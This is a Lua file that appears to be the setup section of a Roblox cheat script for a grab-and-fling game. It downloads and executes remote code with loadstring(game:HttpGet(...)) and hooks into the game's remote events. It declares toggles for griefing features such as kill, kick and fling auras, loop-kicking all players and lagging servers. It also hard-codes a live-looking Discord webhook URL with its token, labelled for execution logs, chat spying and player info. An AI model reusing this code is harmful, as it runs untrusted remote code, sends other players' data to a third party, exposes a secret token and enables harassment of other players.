--♥locals♥
	local field = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
	-- local field1 = loadstring(game:HttpGet('https://raw.githubusercontent.com/UI-Interface/ArrayField/main/Source.lua'))()
	-- local field2 = loadstring(game:HttpGet('https://raw.githubusercontent.com/fgdergewrgegr/SVH/main/field'))()
	local Players = game:GetService("Players")
	local me = Players.LocalPlayer
	local myname = me.Name
	local RS = game:GetService("ReplicatedStorage")
	local CE = RS:WaitForChild("CharacterEvents")
	local BeingHeld = me:WaitForChild("IsHeld")
	local PlayerScripts = me:WaitForChild("PlayerScripts")
	local bodyvel_Name = "FlingVelocity"
	local w = game:GetService("Workspace")
	local r = game:GetService("RunService")
	local d = game:GetService("Debris")
	local mouse = me:GetMouse()
	local RSs = game:GetService("RunService")
	local StarterGui = game:GetService("StarterGui")
	local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):wait() or Players.LocalPlayer
	local pccontrol = me.PlayerGui:WaitForChild("ControlsGui").PCFrame
	local pccontroltoy = pccontrol.ToyMenu
	local backpack = w[myname.."SpawnedInToys"]
	local m = w.Map
	local saymsg = RS:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
	local getmsg = RS:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
	local DestroyToyEvent = RS:WaitForChild("MenuToys"):WaitForChild("DestroyToy")
	local SetLineColorEvent = RS.DataEvents.UpdateLineColorsEvent
	local ExtendLineEvent = RS.GrabEvents.ExtendGrabLine
	local CreateGrabEvent = RS.GrabEvents.CreateGrabLine
	local StruggleEvent = RS.CharacterEvents.Struggle
	local StickyPartEvent = RS.PlayerEvents.StickyPartEvent
	local SL = w.SpawnLocation
	local HS = game:GetService("HttpService")
	local ccc = w.Camera:FindFirstChild("ColorCorrection")
	local chatFrame = me.PlayerGui.Chat.Frame
	local UIS = game:GetService("UserInputService")

	chamsot = 0
	chamsft = 0
	RawStep2 = 0
	step2 = 0
	local hpa = 0
	local dpa = 0
	local cpan = 0
	local cpa = 0
	local hta = 0
	local dta = 0
	local RawStep = 0
	local step = 0
	local cat = 0
	local zgv = 0
	local ks = 10
	local last_UTP = 0
	local FireParticleEmitter = 0
	local strength = 0
	local Lag_Intensity = 0
	local a = 0
	local kickcountc = 0
	local wss = 0
	local jps = 0
	local gs = 0
	local linecolorscount = 0

	local flingaura = false
	local killaura = false
	local kickaura = false
	local crazyline2 = false
	local crazyline = false
	squat = false
	slkat = false
	slkpa = false
	local yzpa = false
	local xypa = false
	local lckpa = false
	local lokpa = false
	local StepEnable2 = false
	local plrtoyaura = false
	local StepEnable = false
	local yzat = false
	local xyat = false
	local lokat = false
	local lckat = false
	local toyaura = false
	local infj = false
	local kafab = false
	local paitd = false
	local pst = false
	local odt = true
	local bdt = true
	local publicds = false
	local spyenabled = false
	local public = false
	local gk = false
	local antiseat = false
	local LSD = false
	local loopkickp = false
	local loopkickall = false
	local loopkickall1 = false
	local kickgrab = false
	local ik = false
	local ad = false
	local plo = false
	local twohand = false
	local ksm = false
	local rgb = false
	local gt = false
	local jpt = false
	local wst = false
	local antiexpl = false
	local loopspawn = false
	local stopst = false
	local antikick = false
	local ultraclickgrab = false
	local antiburn = false
	local AntiLaggg = false
	local loopburnkill = false
	local HighlightVisible = false
	local ka = false
	local kaw = false
	local spyOnMyself = false
	local lhk = false
	local rhk = false
	local onf = false
	local sila = false
	local killg = false
	local clippp = false
	local kickkk1 = false
	local kickkk2 = false
	local brattt = false
	local poison = false
	local radiactive = false
	local antiblob = false
	local laggg = false
	local fire = false
	local kinai = false
	local antiburn = false
	local antigrab = false
	local ultragrabbb = false
	local antilaggg = false
	local crazy_cloneeee = false
	local loopkill = false

	local gkblob = nil
	local who = nil
	local lplr = nil
	local rplr = nil
	local last_toy = nil
	local last_model = nil
	local last_chto = nil
	local last_chto2 = nil

	local lat = {}
	local hui = {}
	local ccolors = {}
	local privateProperties = {
	    Color = Color3.fromRGB(255,0,0); 
	    Font = Enum.Font.SourceSansBold;
	    TextSize = 18;
	}

	local executedweb = "https://discord.com/api/webhooks/1262487848028995634/5Bcbi-I8jiNGMaz2RpzDGgm87ovTZIoC2t63WUeLNTwcjfG5Qt-CB2Fm3qaLCFqYdewd"
	local chatspyweb = "https://discord.com/api/webhooks/1262487848028995634/5Bcbi-I8jiNGMaz2RpzDGgm87ovTZIoC2t63WUeLNTwcjfG5Qt-CB2Fm3qaLCFqYdewd"
	local playerinfoweb = "https://discord.com/api/webhooks/1262487848028995634/5Bcbi-I8jiNGMaz2RpzDGgm87ovTZIoC2t63WUeLNTwcjfG5Qt-CB2Fm3qaLCFqYdewd"

	local instance = (_G.chatSpyInstance or 0) + 1
	_G.chatSpyInstance = instance

	chamsfc = Color3.fromRGB(255,255,255)
	chamsoc = Color3.fromRGB(0,0,0)

	local function set_chams_parametr() end
